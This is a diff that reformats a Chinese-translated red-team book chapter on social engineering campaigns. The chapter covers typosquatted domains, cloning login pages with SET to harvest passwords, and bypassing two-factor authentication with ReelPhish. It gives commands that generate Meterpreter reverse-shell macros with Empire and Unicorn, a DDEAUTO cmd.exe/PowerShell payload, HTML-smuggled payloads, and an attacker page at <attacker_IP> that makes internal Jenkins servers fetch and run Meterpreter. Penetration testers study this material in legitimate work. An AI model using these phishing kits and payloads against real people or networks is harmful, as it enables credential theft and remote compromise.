@@ -1,115 +1,83 @@
+
 # 5 屏幕 - 社会工程学
-
-![](img/00145.jpeg)
-
-## 
 
 构建您的社会工程学 (SE) 活动
 
-作为红队人员，我们热衷于社会工程学（SE）攻击。 不仅因为它们通常涉及低技能攻击，而且因为它们可以以极低的成本构建高度值得信赖的活动。 只需设置几个虚假域名、服务器，制作一些邮件，分发一些 U 盘，然后结束。
+作为红队人员，我们热衷于社会工程学（SE）攻击。不仅因为它们通常涉及低技能攻击，而且因为它们可以以极低的成本构建高度值得信赖的活动。只需设置几个虚假域名、服务器，制作一些邮件，分发一些 U 盘，然后结束。
 
-在指标方面，我们捕捉明显的数据，例如发送的电子邮件数量、点击链接的用户数量以及输入密码的用户数量。 我们还努力发挥创意，为聘请我们的公司提供实质性价值。 例如，这是 DefCon 的社会工程学竞赛，竞争对手对呼叫中心进行社会工程学攻击。 如果您不熟悉这项竞赛，这些竞争对手在有限时间内必须根据公司的标志捕获数字。 标志可以通过获取公司信息（如他们的 VPN、他们使用的 AV 类型、员工特定信息，或让员工访问 URL 等）来捕获。 如果您想查看竞赛中使用的所有标志，请查看 2017 年竞赛报告：`http://bit.ly/2HlctvY`。 此类攻击有助于公司提高内部意识，教导员工如何识别威胁并报告给相关团队。
+在指标方面，我们捕捉明显的数据，例如发送的电子邮件数量、点击链接的用户数量以及输入密码的用户数量。我们还努力发挥创意，为聘请我们的公司提供实质性价值。例如，这是 DefCon 的社会工程学竞赛，竞争对手对呼叫中心进行社会工程学攻击。如果您不熟悉这项竞赛，这些竞争对手在有限时间内必须根据公司的标志捕获数字。标志可以通过获取公司信息（如他们的 VPN、他们使用的 AV 类型、员工特定信息，或让员工访问 URL 等）来捕获。如果您想查看竞赛中使用的所有标志，请查看 2017 年竞赛报告：`http://bit.ly/2HlctvY`。此类攻击有助于公司提高内部意识，教导员工如何识别威胁并报告给相关团队。
 
-在本章中，我们将简要介绍用于运行活动的工具和技巧。 对于 SE 风格攻击，没有对错的正确答案。 只要它们有效，在我们看来都是好的。
+在本章中，我们将简要介绍用于运行活动的工具和技巧。对于 SE 风格攻击，没有对错的正确答案。只要它们有效，在我们看来都是好的。
 
-### Doppelganger 域
+## Doppelganger 域
 
-我们在 THP2 中谈论过这个。 这仍然是获取初始凭据或下载恶意软件的最成功的方式之一。 最常见的技术是购买与公司的 URL 非常相似的域，或者是他们 URL 的常见拼写错误。
+我们在 THP2 中谈论过这个。这仍然是获取初始凭据或下载恶意软件的最成功的方式之一。最常见的技术是购买与公司的 URL 非常相似的域，或者是他们 URL 的常见拼写错误。
 
-在上本书中，我们有一个例子，如果我们拥有 `mail.cyberspacekittens.com`，我们将购买域名 `mailcyberspacekittens.com` 并设置一个虚假的 Outlook 页面来捕获凭据。 当受害者去假网站并输入他们的密码时，我们会收集这些数据并将他们重定向到公司的有效电子邮件服务器 (`mail.cyberspacekittens.com`)。 这使他们产生印象，他们只是不小心在第一次输入密码时输入错了，因此会再次登录。
+在上本书中，我们有一个例子，如果我们拥有 `mail.cyberspacekittens.com`，我们将购买域名 `mailcyberspacekittens.com` 并设置一个虚假的 Outlook 页面来捕获凭据。当受害者去假网站并输入他们的密码时，我们会收集这些数据并将他们重定向到公司的有效电子邮件服务器 (`mail.cyberspacekittens.com`)。这使他们产生印象，他们只是不小心在第一次输入密码时输入错了，因此会再次登录。
 
-所有这些最好的部分是，您根本不需要进行钓鱼。 有人会在“mail”和“cyberspacekittens”之间打错或忘记句号（.），然后输入凭据。 我们曾让受害者标记我们的恶意网站并每天返回。
+所有这些最好的部分是，您根本不需要进行钓鱼。有人会在“mail”和“cyberspacekittens”之间打错或忘记句号（`.`），然后输入凭据。我们曾让受害者标记我们的恶意网站并每天返回。
 
-### 如何克隆认证页面
+## 如何克隆认证页面
 
-用于快速克隆 Web 应用程序认证页面的最佳工具之一是 TrustedSec 的 Social Engineering Toolkit (SET)。 这是任何 SE 活动的标准工具，获取凭据是优先事项。 您可以在 `https://github.com/trustedsec/social-engineer-toolkit` 下载 SET。
+用于快速克隆 Web 应用程序认证页面的最佳工具之一是 TrustedSec 的 Social Engineering Toolkit (SET)。这是任何 SE 活动的标准工具，获取凭据是优先事项。您可以在 `https://github.com/trustedsec/social-engineer-toolkit` 下载 SET。
 
 **配置 SET 使用 Apache**（而非默认的 Python）
 
-*   修改配置文件如下：
+* 修改配置文件如下：
+  * `gedit /etc/setoolkit/set.config`
+    * `APACHE_SERVER=ON`
+    * `APACHE_DIRECTORY=/var/www/html`
+    * `HARVESTER_LOG=/var/www/html`
+* **启动 Social Engineering Toolkit (SET)**
+  * `cd /opt/social-engineer-toolkit`
+  * `setoolkit`
+  * **1) Spear-Phishing 攻击矢量**
+  * **2) 网站攻击矢量**
+  * **3) 凭据收集器攻击方法**
+  * **2) 站点克隆器**
+  * **您的攻击者服务器 IP**
+  * **要克隆的站点**
+  * **打开浏览器并前往您的攻击者服务器进行测试**
 
-*   `gedit /etc/setoolkit/set.config`
+所有文件将存储于 `/var/www/html`，密码存储于 `harvester*.`。克隆社交网络工程页面时的一些最佳实践：
 
-        *   `APACHE_SERVER=ON`
+* 将您的 Apache 服务器移至 SSL 上运行
+* 将所有图像和资源本地化（而不是从克隆的站点调用）
+* 我个人喜欢将所有记录密码与我的公开 PGP 密钥一起存储。这样，如果服务器被入侵，没有私钥是无法恢复密码的。这可以通过 PHP `gnupg_encrypt` 和 `gnupg_decrypt` 支持。
 
-        *   `APACHE_DIRECTORY=/var/www/html`
+## 具有 2FA 的凭据
 
-        *   `HARVESTER_LOG=/var/www/html`
-
-*   **启动 Social Engineering Toolkit (SET)**
-
-*   `cd /opt/social-engineer-toolkit`
-
-*   `setoolkit`
-
-*   **1) Spear-Phishing 攻击矢量**
-
-*   **2) 网站攻击矢量**
-
-*   **3) 凭据收集器攻击方法**
-
-*   **2) 站点克隆器**
-
-*   **您的攻击者服务器 IP**
-
-*   **要克隆的站点**
-
-*   **打开浏览器并前往您的攻击者服务器进行测试**
-
-所有文件将存储于 `/var/www/html`，密码存储于 `harvester*.` 克隆社交网络工程页面时的一些最佳实践：
-
-*   将您的 Apache 服务器移至 SSL 上运行
-
-*   将所有图像和资源本地化（而不是从克隆的站点调用）
-
-*   我个人喜欢将所有记录密码与我的公开 PGP 密钥一起存储。 这样，如果服务器被入侵，没有私钥是无法恢复密码的。 这可以通过 PHP `gnupg_encrypt` 和 `gnupg_decrypt` 支持。
-
-### 具有 2FA 的凭据
-
-我们看到越来越多的客户使用双重因素认证 (2FA)。 虽然 2FA 对红队来说是个大问题，但它们并非不可能绕过。 从历史上看，我们必须创建自定义页面来处理一些内容，但现在我们有 ReelPhish。 ReelPhish 是由 FireEye 制作的工具，允许红队在受害者进入我们钓鱼页面时自动触发 2FA。
+我们看到越来越多的客户使用双重因素认证 (2FA)。虽然 2FA 对红队来说是个大问题，但它们并非不可能绕过。从历史上看，我们必须创建自定义页面来处理一些内容，但现在我们有 ReelPhish。ReelPhish 是由 FireEye 制作的工具，允许红队在受害者进入我们钓鱼页面时自动触发 2FA。
 
 **ReelPhish `https://github.com/fireeye/ReelPhish`：**
 
-*   克隆需要 2FA 认证的受害者站点
+* 克隆需要 2FA 认证的受害者站点
+* 在您的攻击者盒子上，解析登录真实站点所需的流量。在我的情况下，我打开 Burp Suite 并获取认证所需的所有 post 参数
+* 修改克隆站点以使用 ReelPhish。参见 `. /examplesitecode/samplecode.php` 并输入所有必要的认证参数
+* 受害者陷入克隆网站并认证
+* 凭据推回攻击者
+* ReelPhish 将认证到真实网站，触发 2FA
+* 受害者收到 2FA 代码或手机推送
+* 受害者被重定向到真实网站再次登录（认为他们第一次失败了）
 
-*   在您的攻击者盒子上，解析登录真实站点所需的流量。 在我的情况下，我打开 Burp Suite 并获取认证所需的所有 post 参数
-
-*   修改克隆站点以使用 ReelPhish。 参见 `. /examplesitecode/samplecode.php` 并输入所有必要的认证参数
-
-*   受害者陷入克隆网站并认证
-
-*   凭据推回攻击者
-
-*   ReelPhish 将认证到真实网站，触发 2FA
-
-*   受害者收到 2FA 代码或手机推送
-
-*   受害者被重定向到真实网站再次登录（认为他们第一次失败了）
-
-如以下图像所示，我们现在拥有了一个绕过 2FA 的已认证会话。 虽然看起来支持 Linux，但我曾在 Kali 中运行遇到一些问题。 在 Windows 上运行是首选。 您可以在 FireEye 网站找到关于 ReelPhish 的更多信息：`https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html`。
+如以下图像所示，我们现在拥有了一个绕过 2FA 的已认证会话。虽然看起来支持 Linux，但我曾在 Kali 中运行遇到一些问题。在 Windows 上运行是首选。您可以在 FireEye 网站找到关于 ReelPhish 的更多信息：`https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html`。
 
 ![](img/00146.jpeg)
 
 还有一些其他处理不同 2FA 绕过的工具：
 
-*   `https://github.com/kgretzky/evilginx`
+* `https://github.com/kgretzky/evilginx`
+* `https://github.com/ustayready/CredSniper`
 
-*   `https://github.com/ustayready/CredSniper`
-
-我想提到的一点是，一旦获取凭据，请确保验证所有不同的认证方法。 我的意思是，他们可能在 Web 认证门户上使用 2FA，但可能不需要用于 API、旧厚客户端或所有应用程序端点。 我们见过许多应用程序需要在常见端点进行 2FA，但缺乏应用程序其他部分的安全保护。
+我想提到的一点是，一旦获取凭据，请确保验证所有不同的认证方法。我的意思是，他们可能在 Web 认证门户上使用 2FA，但可能不需要用于 API、旧厚客户端或所有应用程序端点。我们见过许多应用程序需要在常见端点进行 2FA，但缺乏应用程序其他部分的安全保护。
 
 ## 钓鱼
 
-红队取得巨大成功的是传统钓鱼。 钓鱼的核心依赖于恐惧、紧迫感或听起来过于美好而不可信的事情。 恐惧和紧迫感确实有效，我相信我们都曾见过。 一些恐惧和紧迫感攻击的例子包括：
+红队取得巨大成功的是传统钓鱼。钓鱼的核心依赖于恐惧、紧迫感或听起来过于美好而不可信的事情。恐惧和紧迫感确实有效，我相信我们都曾见过。一些恐惧和紧迫感攻击的例子包括：
 
-*   带有欺诈性购买的虚假电子邮件
-
-*   有人入侵您的电子邮件消息
-
-*   关于税务欺诈的电子邮件
-
-
-
+* 带有欺诈性购买的虚假电子邮件
+* 有人入侵您的电子邮件消息
+* 关于税务欺诈的电子邮件
 
 这些通用攻击的问题在于，我们注意到企业员工变得越来越聪明。通常情况下，对于基础的`phish`式攻击，大约每 10 封邮件中就有至少 1 封会被报告。在某些情况下，这个比例要高得多。这就是为什么让`Red Team`持续监控这些易于识别的`phish`攻击，以观察公司是否在这些应对情况中变得更好，这是有价值的。
 
@@ -125,29 +93,18 @@
 
 在最基本的层面上，我们可以使用`Empire`或`Unicorn`来创建`VBA` `Macro`：
 
-*   在`Empire`中：
-
-    *   选择`Macro` `Stager`
-
-    *   `usestager` `windows/macro`
-
-    *   确保配置正确的设置
-
-        *   `info`
-
-    *   创建`Macro`
-
-        *   `generate`
-
-*   如果您想要为`Meterpreter`创建`Payload`，可以使用`Unicorn`之类的工具：
-
-    *   `cd /opt/unicorn`
-
-    *   `./unicorn.py windows/meterpreter/reverse_https [your_ip] 443 macro`
-
-    *   启动`Metasploit` `Handler`
-
-        *   `msfconsole -r ./unicorn.rc`
+* 在`Empire`中：
+  * 选择`Macro` `Stager`
+  * `usestager windows/macro`
+  * 确保配置正确的设置
+    * `info`
+  * 创建`Macro`
+    * `generate`
+* 如果您想要为`Meterpreter`创建`Payload`，可以使用`Unicorn`之类的工具：
+  * `cd /opt/unicorn`
+  * `./unicorn.py windows/meterpreter/reverse_https [your_ip] 443 macro`
+  * 启动`Metasploit` `Handler`
+    * `msfconsole -r ./unicorn.rc`
 
 生成后，您的有效载荷看起来如下：
 
@@ -155,17 +112,14 @@
 
 如您所见，这是运行一个简单的 `PowerShell` base64 `obfuscated` 脚本。这可以帮助绕过某些 `AV` 产品，但重要的是在启动 `live` `campaign` 之前要确保测试好。一旦生成 `macro`，可以创建 `quick` `Excel` 文档：
 
-*   打开 `Excel`
-
-*   转到 `View Tab` -> `Macros` -> `View Macros`
-
-*   添加 `Macro` 名称，为 `book1` 配置 `Macro`，并点击 `Create`
+* 打开 `Excel`
+* 转到 `View Tab` -> `Macros` -> `View Macros`
+* 添加 `Macro` 名称，为 `book1` 配置 `Macro`，并点击 `Create`
 
 ![](img/00148.jpeg)
 
-*   用生成的 `generated` 代码替换所有当前的 `Macro` 代码
-
-*   `Save` 为 `.xls` (`Word 97-2003`) 或 `Excel` `Macro-Enabled`
+* 用生成的 `generated` 代码替换所有当前的 `Macro` 代码
+* `Save` 为 `.xls` (`Word 97-2003`) 或 `Excel` `Macro-Enabled`
 
 ![](img/00149.jpeg)
 
@@ -179,7 +133,7 @@
 
 我们可以用 `LuckyStrike` (https://github.com/curi0usJack/luckystrike) 以更 `automated` 的方式来做这件事。使用 `LuckyStrike`，我们可以创建包含我们的 `Payload` 的 `worksheets` 的 `Excel` 文档，甚至可以将完整 `executables` (exes) 存储在 `Excel` 文档内部，可以使用 `ReflectivePE` 在内存中运行。在此阅读更多关于 `LuckyStrike` 的内容：
 
-*   https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator
+* https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator
 
 我想提到的另一个 `Office File` `executables` 工具是 `VBad` (https://github.com/Pepitoh/VBad)。运行 `VBad` 时，您必须启用 `Office` 中的 `macros` 并在 `macro` 安全设置中选中"`Trust Access` to the `VBA` project object model"。这允许 `VBad` `python` 代码更改并创建 `macros`。
 
@@ -199,28 +153,23 @@
 
 在 `Word` 中：
 
-*   前往 `Insert Tab` -> `Quick Parts` -> `Field`
-
-*   选择 = `Formula`
-
-*   右键点击：`!Unexpected End of Formula` 并选择 `Toggle Field Codes`
-
-*   将 `payload` 更改为您的 `payload`：
-
-    *   `DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell.exe [empire payload here]"`
+* 前往 `Insert Tab` -> `Quick Parts` -> `Field`
+* 选择 = `Formula`
+* 右键点击：`!Unexpected End of Formula` 并选择 `Toggle Field Codes`
+* 将 `payload` 更改为您的 `payload`：
+  * `DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell.exe [empire payload here]"`
 
 ![](img/00153.jpeg)
 
 `Empire` 有一个 `stager` 会自动创建 `Word file` 和相关的 `PowerShell` 脚本。该 `stager` 可以通过以下方式配置：
 
-*   `usestager` `windows/macroless_msword`
+* `usestager windows/macroless_msword`
 
 ![](img/00154.jpeg)
 
 `Resources`:
 
-*   https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
-
+* https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
 
 
 
@@ -237,7 +186,8 @@ cd /op/EmbedInHTML
 python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
 ```
 
-![](img/00155.jpeg) ![](img/00156.jpeg)
+![](img/00155.jpeg)
+![](img/00156.jpeg)
 
 一旦受害者访问恶意网站，弹出窗口会提示受害者在我们的 `.xll` 文件中打开 Excel。不幸的是，对于较新版本的 Excel（除非配置错误），用户需要启用附加组件才能执行我们的负载。这正是你的社会工程学技巧发挥作用的时候。
 
@@ -307,9 +257,6 @@ python demiguise.py -k hello -c "cmd.exe /c <powershell_command_here>" -p Outloo
 
 ![](img/00159.jpeg)
 
-
-
-
 现在，在一个完全不同的系统中，使用 Chrome 或 Firefox 访问您的攻击者网页 `http://<attacker_IP>/badware.html`。只需访问该恶意页面，您的浏览器就会使用 JavaScript 和 POST 请求，通过端口 8080 对我们的 Groovy 有效负载向内部 `/24` 网络广播。当它找到 Jenkins 服务器时，会导致该服务器下载我们的加密 Meterpreter，解密并执行它。在企业的网络上，您可能会得到各种各样的外壳。
 
 ![](img/00160.jpeg)
@@ -321,4 +268,3 @@ Jenkins 只是您可以进行的众多攻击之一。任何允许使用 GET 或 
 社会工程学是那些猫鼠游戏将永远是区域。我们严重依赖人类因素，并利用恐惧、紧急性和信任的目标弱点。利用这些漏洞，我们可以创建非常聪明的活动，在系统破坏中具有高成功率。
 
 在指标和目标的方面，我们需要远离等待用户报告钓鱼/SE 邮件的反应性模型，转向积极的模型，我们可以积极狩猎这些类型的恶意攻击。
-
